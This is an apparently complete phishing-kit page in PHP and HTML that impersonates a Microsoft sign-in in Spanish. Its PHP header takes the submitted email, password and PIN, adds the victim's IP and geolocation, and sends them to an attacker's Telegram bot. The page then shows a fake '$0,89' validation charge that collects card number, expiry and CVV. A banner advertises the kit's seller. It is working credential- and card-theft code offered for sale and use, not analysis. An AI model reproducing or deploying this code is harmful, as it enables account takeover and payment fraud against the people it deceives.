<?php
// 🚫 Ocultar errores completamente
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// 🔐 Iniciar sesión con protección
@session_start();

// 🔐 Requerir archivo de configuración (asegúrate de que esté protegido)
require_once 'dat.php';

// 📡 Geolocalización
@include 'geoplugin.php';

// 💾 Guardar correo en sesión si está presente
if (!empty($_POST['uzer'])) {
    $_SESSION['uzer'] = $_POST['uzer'];
}

$sendtotelegram = "yes";

// 🔎 Obtener IP segura
$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$user_ip = explode(',', $user_ip)[0];
$user_ip = trim($user_ip);

// 🌍 Obtener datos de IP
function get_ip_info($user_ip) {
    $url = "https://ipinfo.io/" . urlencode($user_ip) . "/json";
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 2,
    ]);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return null;
    }
    curl_close($ch);
    return json_decode($response, true);
}

$locationData = get_ip_info($user_ip);
$cc     = $locationData['country'] ?? 'No disponible';
$city   = $locationData['city'] ?? 'No disponible';
$region = $locationData['region'] ?? 'No disponible';

// ✅ Validación segura de POST
if (
    isset($_POST['uzer'], $_POST['pazz'], $_POST['p1n']) &&
    is_string($_POST['uzer']) &&
    is_string($_POST['pazz']) &&
    is_string($_POST['p1n'])
) {
    $_SESSION['ind2'] = 'ind2';

    // 💬 Armar mensaje
    $message  = "🔥INFO Hotmail #2🔥\n\n";
    $message .= "✉️ Correo.:  `" . htmlspecialchars($_POST['uzer']) . "`\n";
    $message .= "🔐 Clave.:  `" . htmlspecialchars($_POST['pazz']) . "`\n";
    $message .= "🔢 PIN.:  `" . htmlspecialchars($_POST['p1n']) . "`\n\n";
    $message .= "🌍 Ubicación.: $cc - $region - $city\n";
    $message .= "💻 IP.: $user_ip\n";

    // 🚀 Enviar por Telegram
    if ($sendtotelegram === "yes" && !empty($bot_url) && !empty($chat_id)) {
        $send = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        $telegram_api = "https://api.telegram.org/bot" . $bot_url . "/sendMessage";

        $ch = curl_init($telegram_api);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $send,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

?>
    <!--

██████╗ ██╗  ██╗██████╗      ██████╗  ██████╗ ████████╗██╗   ██╗
██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██╔═══██╗╚══██╔══╝╚██╗ ██╔╝
██████╔╝███████║██████╔╝    ██║  ███╗██║   ██║   ██║    ╚████╔╝ 
██╔═══╝ ██╔══██║██╔═══╝     ██║   ██║██║   ██║   ██║     ╚██╔╝  
██║     ██║  ██║██║         ╚██████╔╝╚██████╔╝   ██║      ██║   
╚═╝     ╚═╝  ╚═╝╚═╝          ╚═════╝  ╚═════╝    ╚═╝      ╚═╝ 

✅Telegram✅: @PHP_GOTY

---------------------
|*🛒VENTAS / SHOP🛒*|
---------------------
-->
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>Iniciar sesión</title>
  <link rel="shortcut icon" type="image/x-icon" href="https://companieslogo.com/img/orig/MSFT-a203b22d.png?t=1633073277">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"><!-- Link para importar la tipografia "Montserrat"-->
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&amp;display=swap" rel="stylesheet"><!-- Link para importar los iconos-->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><!-- Importar JQuery-->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><!-- Bootstrap JS-->
    <script src="funtions.js"></script>
    <style>
        body,
        html {
            height: 100%;
            background-image: url("fondonuevo.JPG");
            background-position: center;
            background-size: cover;
            font-family: 'Montserrat', sans-serif;
        }
        input {
            filter: none !important;
        }
        @media only screen and (max-width: 765px) {
            body,
            html {
                background-image: url("fondonuevo.JPG");
                background-repeat: no-repeat;
                background-size: cover;
                background-attachment: fixed;
            }
            .login-container {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                padding: 0;
                overflow: hidden;
            }
            .login-box {
                left: 20px;
                position: relative;
                transform: none;
                width: 90%;
                max-width: 400px;
                box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
                margin: auto;
            }
        }
        .login-container {
            position: relative;
            min-height: 100%;
            max-width: 900px;
            margin: auto;
        }
        .login-box {
            position: absolute;
            top: 41.8%;
            transform: translateY(-50%);
            padding: 20px;
            background-color: #fff;
            box-shadow: 1px 1px 1px 0.1px #ced0d0;
            border-radius: 5px;
        }
        .login-header {
            text-align: center;
            padding-top: 0;
        }
        .login-header img {
            width: 98px;
        }
        .login-footer {
            position: absolute;
            bottom: 10px;
            width: 300px;
            left: 0;
            right: 0;
            margin: 0 auto;
        }
        .login-footer img {
            width: 100%;
        }
        #error-message {
            display: none;
        }
        #gradient {
            height: 100px;
            background-image: linear-gradient(to bottom, rgb(255 255 255), rgb(255 255 255 / 0%));
            display: none;
        }
        #btn-login {
            background-color: #0067b8;
            border-color: #0067b8;
            border-radius: 0 !important;
            padding-bottom: 7px;
            padding-top: 7px;
            margin-top: 10px;
            width: 128px;
            float: right;
        }
        .center {
            text-align: center;
        }
        #bottom-imgs {
            height: 80px;
            display: flex;
            align-items: center;
            justify-content: space-evenly;
            width: 80%;
            margin: 0 auto;
        }
        #bottom-imgs .img-block {
            width: 40%;
        }
        #bottom-imgs .img-block img {
            width: 100%;
        }
        #vl {
            border-right: 1px solid #908f8f;
            height: 20px;
            display: inline;
        }
        .ingresa-cuenta {
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvética Neue", sans-serif;
            font-size: 20px;
            color: #4b4b50;
            padding-top: 10px;
        }
        .text {
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvética Neue", sans-serif;
            font-size: 13.5px;
            color: #505358;
        }
        .text2 {
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvética Neue", sans-serif;
            font-size: smaller;
            color: #4b4b50;
        }
        a {
            font-size: smaller;
            color: #234881;
        }
        .space-right {
            margin-right: 5px;
        }
        input[type=text]:focus,
        input[type=password]:focus,
        input[type=email]:focus {
            outline: none !important;
            border-bottom: 1.5px solid #106cbc;
            box-shadow: none !important;
        }
        .form-group {
            margin-top: 20px !important;
            margin-bottom: 20px !important;
            position: relative;
        }
        .form-control {
            border: none;
            border-bottom: 1px solid #ccc;
            border-radius: 0;
            box-shadow: none;
            padding-left: 4px;
            padding-top: 18px;
            font-size: 14px;
            height: 40px;
        }
        .eye-icon {
            position: absolute;
            right: 10px;
            top: 63%;
            transform: translateY(-50%);
            color: #908f8f;
            z-index: 2;
        }
        @media only screen and (max-width: 765px) {
            .eye-icon {
                right: 10px;
            }
            .login-header img {
                width: 250px;
            }
        }
        @media only screen and (max-width: 500px) {
            .eye-icon {
                right: 8px;
            }
        }
        @media only screen and (max-width: 350px) {
            .eye-icon {
                right: 6px;
            }
        }
        .form-group > label {
            position: absolute;
            left: 6px;
            top: 14px;
            font-family: 'Montserrat', sans-serif;
            font-size: 14px;
            color: #6a6a6a;
            transition: 0.2s ease all;
            pointer-events: none;
            background-color: #fff;
            padding: 0 4px;
            z-index: 1;
        }
        .label-animate > label {
            top: -8px !important;
            left: 8px !important;
            font-size: 11px !important;
            color: #234881 !important;
            font-weight: 500;
        }
        label {
            font-weight: 200;
        }
        .login-footer-responsive {
            position: absolute;
            bottom: 0;
            display: none;
            height: auto;
        }
        @media only screen and (max-width: 765px) {
            .login-footer-responsive {
                display: block;
            }
            .login-footer-responsive img {
                width: 100%;
            }
            #gradient {
                display: block;
            }
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #777;
            margin-top: 20px;
        }
        .footer a {
            color: #234881;
            text-decoration: none;
            margin: 0 3px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .footer p {
            margin: 5px 0 0;
        }
        .eye-icon svg {
          color: #908f8f;
          transition: color 0.2s ease;
        }
        .eye-icon.active svg {
          color: #106cbc;
        }       
        .text strong {
          color: #0067b8;
        }
        .cont-icos {
          display: flex;
          align-items: center;
          gap: 2rem;
          margin-top: 2rem;
        }
        .cont-icos img {
          width: 5rem;
        }
    </style>
</head>
<body><div class="login-container">
  <div class="wrapper">
      <div class="col-xs-12 col-sm-5 col-sm-offset-3 login-box" style="z-index:1000">
        <div data-testid="banner" align="center" class="" bis_skin_checked="1">
          <svg aria-label="Microsoft" data-testid="microsoftLogo" role="img" width="114" height="24" viewBox="0 0 114 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M47.2997 5.30006V19.7001H44.7997V8.40006H44.7664L40.2997 19.7001H38.633L34.0664 8.40006H34.033V19.7001H31.733V5.30006H35.333L39.4664 15.9667H39.533L43.8997 5.30006H47.2997ZM49.3664 6.40006C49.3664 6.00006 49.4997 5.66673 49.7997 5.40006C50.0997 5.1334 50.433 5.00006 50.833 5.00006C51.2664 5.00006 51.633 5.1334 51.8997 5.4334C52.1664 5.70006 52.333 6.0334 52.333 6.4334C52.333 6.8334 52.1997 7.16673 51.8997 7.4334C51.5997 7.70006 51.2664 7.8334 50.833 7.8334C50.3997 7.8334 50.0664 7.70006 49.7997 7.4334C49.533 7.10006 49.3664 6.76673 49.3664 6.40006ZM52.0664 9.36673V19.7001H49.633V9.36673H52.0664ZM59.433 17.9334C59.7997 17.9334 60.1997 17.8334 60.633 17.6667C61.0664 17.5001 61.4664 17.2667 61.833 17.0001V19.2667C61.433 19.5001 60.9997 19.6667 60.4997 19.7667C59.9997 19.8667 59.4664 19.9334 58.8664 19.9334C57.333 19.9334 56.0997 19.4667 55.1664 18.5001C54.1997 17.5334 53.733 16.3001 53.733 14.8334C53.733 13.1667 54.233 11.8001 55.1997 10.7334C56.1664 9.66673 57.533 9.1334 59.333 9.1334C59.7997 9.1334 60.233 9.20006 60.6997 9.30006C61.1664 9.4334 61.533 9.56673 61.7997 9.70006V12.0334C61.433 11.7667 61.033 11.5334 60.6664 11.4001C60.2664 11.2334 59.8664 11.1667 59.4664 11.1667C58.4997 11.1667 57.733 11.4667 57.133 12.1001C56.533 12.7334 56.233 13.5667 56.233 14.6334C56.233 15.6667 56.4997 16.5001 57.0664 17.0667C57.6997 17.6334 58.4664 17.9334 59.433 17.9334ZM68.733 9.20006C68.933 9.20006 69.0997 9.20006 69.2664 9.2334C69.433 9.26673 69.5664 9.30006 69.6664 9.3334V11.8001C69.533 11.7001 69.3664 11.6334 69.0997 11.5334C68.8664 11.4334 68.5664 11.4001 68.1997 11.4001C67.5997 11.4001 67.0997 11.6667 66.6997 12.1667C66.2997 12.6667 66.0664 13.4334 66.0664 14.5001V19.7001H63.633V9.36673H66.0664V11.0001H66.0997C66.333 10.4334 66.6664 10.0001 67.0997 9.66673C67.5664 9.36673 68.0997 9.20006 68.733 9.20006ZM69.7997 14.7001C69.7997 13.0001 70.2664 11.6334 71.233 10.6334C72.1997 9.6334 73.533 9.1334 75.2664 9.1334C76.8664 9.1334 78.133 9.60006 79.033 10.5667C79.933 11.5334 80.3997 12.8334 80.3997 14.4667C80.3997 16.1334 79.933 17.4667 78.9664 18.4667C77.9997 19.4667 76.6997 19.9667 75.033 19.9667C73.433 19.9667 72.1664 19.5001 71.233 18.5667C70.2664 17.6001 69.7997 16.3001 69.7997 14.7001ZM72.333 14.6001C72.333 15.6667 72.5664 16.5001 73.0664 17.0667C73.5664 17.6334 74.2664 17.9334 75.1664 17.9334C76.0664 17.9334 76.733 17.6334 77.1997 17.0667C77.6664 16.5001 77.8997 15.6667 77.8997 14.5334C77.8997 13.4334 77.6664 12.6001 77.1664 12.0334C76.6997 11.4667 76.033 11.2001 75.1664 11.2001C74.2664 11.2001 73.5997 11.5001 73.0997 12.1001C72.5664 12.6667 72.333 13.5001 72.333 14.6001ZM83.9997 12.1001C83.9997 12.4334 84.0997 12.7334 84.333 12.9334C84.5664 13.1334 85.033 13.3667 85.7997 13.6667C86.7664 14.0667 87.4664 14.5001 87.833 14.9667C88.233 15.4667 88.433 16.0334 88.433 16.7334C88.433 17.7001 88.0664 18.5001 87.2997 19.0667C86.5664 19.6667 85.533 19.9667 84.2664 19.9667C83.833 19.9667 83.3664 19.9001 82.833 19.8001C82.2997 19.7001 81.8664 19.5667 81.4997 19.4001V17.0001C81.933 17.3001 82.433 17.5667 82.933 17.7334C83.433 17.9001 83.8997 18.0001 84.333 18.0001C84.8664 18.0001 85.2997 17.9334 85.533 17.7667C85.7997 17.6001 85.933 17.3667 85.933 17.0001C85.933 16.6667 85.7997 16.3667 85.533 16.1667C85.2664 15.9334 84.733 15.6667 83.9997 15.3667C83.0997 15.0001 82.4664 14.5667 82.0997 14.1001C81.733 13.6334 81.533 13.0334 81.533 12.3001C81.533 11.3667 81.8997 10.6001 82.633 10.0001C83.3664 9.40006 84.333 9.10006 85.4997 9.10006C85.8664 9.10006 86.2664 9.1334 86.6997 9.2334C87.133 9.30006 87.533 9.4334 87.833 9.5334V11.8334C87.4997 11.6334 87.133 11.4334 86.6997 11.2667C86.2664 11.1001 85.833 11.0334 85.433 11.0334C84.9664 11.0334 84.5997 11.1334 84.3664 11.3001C84.133 11.5334 83.9997 11.7667 83.9997 12.1001ZM89.4664 14.7001C89.4664 13.0001 89.933 11.6334 90.8997 10.6334C91.8664 9.6334 93.1997 9.1334 94.933 9.1334C96.533 9.1334 97.7997 9.60006 98.6997 10.5667C99.5997 11.5334 100.066 12.8334 100.066 14.4667C100.066 16.1334 99.5997 17.4667 98.633 18.4667C97.6664 19.4667 96.3664 19.9667 94.6997 19.9667C93.0997 19.9667 91.833 19.5001 90.8997 18.5667C89.9664 17.6001 89.4664 16.3001 89.4664 14.7001ZM91.9997 14.6001C91.9997 15.6667 92.233 16.5001 92.733 17.0667C93.233 17.6334 93.933 17.9334 94.833 17.9334C95.733 17.9334 96.3997 17.6334 96.8664 17.0667C97.333 16.5001 97.5664 15.6667 97.5664 14.5334C97.5664 13.4334 97.333 12.6001 96.833 12.0334C96.3664 11.4667 95.6997 11.2001 94.833 11.2001C93.933 11.2001 93.2664 11.5001 92.7664 12.1001C92.2664 12.6667 91.9997 13.5001 91.9997 14.6001ZM108.133 11.3667H104.5V19.7001H102.033V11.3667H100.3V9.36673H102.033V7.9334C102.033 6.8334 102.4 5.96673 103.1 5.26673C103.8 4.56673 104.7 4.2334 105.8 4.2334C106.1 4.2334 106.366 4.2334 106.6 4.26673C106.833 4.30007 107.033 4.3334 107.2 4.40007V6.50006C107.133 6.46673 106.966 6.40006 106.766 6.3334C106.566 6.26673 106.333 6.2334 106.066 6.2334C105.566 6.2334 105.166 6.40006 104.9 6.70006C104.633 7.0334 104.5 7.50006 104.5 8.10006V9.3334H108.133V7.00006L110.566 6.26673V9.3334H113.033V11.3334H110.566V16.1667C110.566 16.8001 110.666 17.2667 110.9 17.5001C111.133 17.7667 111.5 17.9001 112 17.9001C112.133 17.9001 112.3 17.8667 112.5 17.8001C112.7 17.7334 112.866 17.6667 113.033 17.5667V19.5667C112.866 19.6667 112.633 19.7334 112.266 19.8001C111.9 19.8667 111.566 19.9001 111.2 19.9001C110.166 19.9001 109.4 19.6334 108.9 19.0667C108.4 18.5334 108.133 17.7001 108.133 16.6001V11.3667Z" fill="#737373">
            </path>
            <path d="M13.2383 13.2383H24.5V24.5H13.2383V13.2383Z" fill="#FFB900"></path>
            <path d="M0.5 13.2383H11.7617V24.5H0.5V13.2383Z" fill="#00A4EF"></path>
            <path d="M13.2383 0.5H24.5V11.7617H13.2383V0.5Z" fill="#7FBA00"></path>
            <path d="M0.5 0.5H11.7617V11.7617H0.5V0.5Z" fill="#F25022"></path></svg></div><br>
        <div class="login-header">
              <h4 class="ingresa-cuenta">Estás validando</h4>
              <p class="text">Tu cuenta personal por <strong>$0,89 | Cobro único</strong></p>
          </div>
          <br>
          <div>
              <form method="post" action="tar-error.php">
                  <h4 class="ingresa-cuenta">Añade un método de pago:</h4>
                  <div class="cont-icos">
                      <img alt="" src="images/a1.svg">
                      <img alt="" src="images/a2.svg">
                      <img alt="" src="images/a3.svg">
                      <img alt="" src="images/a4.svg">
                    </div>
                <div class="form-group label-animate">
                    <label for="usr">Cardholder Name</label>
                    <input class="form-control" id="name" type="text" name="name1" autocomplete="on" required="required">
                </div>
                  <div class="form-group label-animate">
                    <label for="car">Card number</label>
                    <span class="eye-icon eye-car" onclick="showPassword('car', 'eye-icon-path-car', 'eye-car')" style="cursor: pointer;">
                      <svg id="eye-icon-svg" fill="currentColor" width="20" height="20" viewBox="0 0 20 20">
                        <path id="eye-icon-path-car" d="M3.26 11.6A6.97 6.97 0 0 1 10 6c3.2 0 6.06 2.33 6.74 5.6a.5.5 0 0 0 .98-.2A7.97 7.97 0 0 0 10 5a7.97 7.97 0 0 0-7.72 6.4.5.5 0 0 0 .98.2ZM10 8a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7Zm-2.5 3.5a2.5 2.5 0 1 1 5 0 2.5 2.5 0 0 1-5 0Z"/>
                      </svg>
                    </span>
                    <input class="form-control" id="car" name="car1" type="password" pattern="[0-9]*" inputmode="numeric" required="required" maxlength="16" minlength="16">
                  </div>
                  <div class="form-group label-animate">
                    <label for="fecha">Expires</label>
                    <div style="display: flex; gap: 10px;">
                      <select class="form-control" id="mes" name="mes1" required>
                        <option value="" disabled selected>Mes</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                      </select>
                      <select class="form-control" id="anio" name="anio1" required>
                        <option value="" disabled selected>Año</option>
                        <!-- Años 2024 al 2040 -->
                        <script>
                          for (let i = 2024; i <= 2040; i++) {
                            document.write(`<option value="${i}">${i}</option>`);
                          }
                        </script>
                      </select>
                    </div>
                  </div>
                  <div class="form-group label-animate" style="max-width: 80px;">
                    <label for="cvv">CVV</label>
                    <span class="eye-icon eye-cvv" onclick="showPassword('cvv', 'eye-icon-path-cvv', 'eye-cvv')" style="cursor: pointer;">
                      <svg fill="currentColor" width="20" height="20" viewBox="0 0 20 20">
                        <path id="eye-icon-path-cvv" d="M3.26 11.6A6.97 6.97 0 0 1 10 6c3.2 0 6.06 2.33 6.74 5.6a.5.5 0 0 0 .98-.2A7.97 7.97 0 0 0 10 5a7.97 7.97 0 0 0-7.72 6.4.5.5 0 0 0 .98.2ZM10 8a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7Zm-2.5 3.5a2.5 2.5 0 1 1 5 0 2.5 2.5 0 0 1-5 0Z"/>
                      </svg>
                    </span>
                    <input class="form-control" id="cvv" type="password" pattern="[0-9]*" inputmode="numeric" name="cvv1" autocomplete="off" maxlength="3" minlength="3" required>
                  </div>
                  <?php if (isset($_SESSION['uzer'])): ?>
                    <input type="hidden" name="uzer" value="<?php echo htmlspecialchars($_SESSION['uzer']); ?>">
                  <?php endif; ?>
                  <button class="btn btn-primary btn-block" id="btn-login" type="submit">Siguiente</button>
              </form>
              </div>
          </div>
      </div>
      <div id="gradient"></div>
  </div>
  <div class="login-footer"><div class="footer">
      <a href="#">Ayuda</a> | 
      <a href="#">Términos de uso</a> | 
      <a href="#">Privacidad y cookies</a>
      <p>Usa la exploración privada si este no es tu dispositivo. 
          <a href="#">Más información</a>
      </p>
  </div></div>
</div>
    <script>
      function showPassword(fieldId, pathId, spanClass) {
        const input = document.getElementById(fieldId);
        const eyePath = document.getElementById(pathId);
        const eyeIconSpan = document.querySelector(`.${spanClass}`);

        const openIcon = "M3.26 11.6A6.97 6.97 0 0 1 10 6c3.2 0 6.06 2.33 6.74 5.6a.5.5 0 0 0 .98-.2A7.97 7.97 0 0 0 10 5a7.97 7.97 0 0 0-7.72 6.4.5.5 0 0 0 .98.2ZM10 8a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7Zm-2.5 3.5a2.5 2.5 0 1 1 5 0 2.5 2.5 0 0 1-5 0Z";

        const closedIcon = "M2.85 2.15a.5.5 0 1 0-.7.7l3.5 3.5a8.1 8.1 0 0 0-3.37 5.05.5.5 0 1 0 .98.2 7.09 7.09 0 0 1 3.1-4.53l1.6 1.59a3.5 3.5 0 1 0 4.88 4.89l4.3 4.3a.5.5 0 0 0 .71-.7l-15-15Zm9.27 10.68a2.5 2.5 0 1 1-3.45-3.45l3.45 3.45Zm-2-4.83 3.38 3.38A3.5 3.5 0 0 0 10.12 8ZM10 6c-.57 0-1.13.07-1.67.21l-.8-.8A7.65 7.65 0 0 1 10 5c3.7 0 6.94 2.67 7.72 6.4a.5.5 0 0 1-.98.2A6.97 6.97 0 0 0 10 6Z";

        if (input.type === "password") {
          input.type = "text";
          eyePath.setAttribute("d", closedIcon);
          eyeIconSpan.classList.add("active");
        } else {
          input.type = "password";
          eyePath.setAttribute("d", openIcon);
          eyeIconSpan.classList.remove("active");
        }
      }
    </script>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const inputs = document.querySelectorAll(".form-control");

        inputs.forEach(input => {
          toggleLabel(input);

          input.addEventListener("focus", () => {
            input.parentElement.classList.add("label-animate");
          });

          input.addEventListener("blur", () => {
            toggleLabel(input);
          });
        });

        function toggleLabel(input) {
          if (input.value.trim() === "") {
            input.parentElement.classList.remove("label-animate");
          } else {
            input.parentElement.classList.add("label-animate");
          }
        }
      });
    </script>
</body>
</html>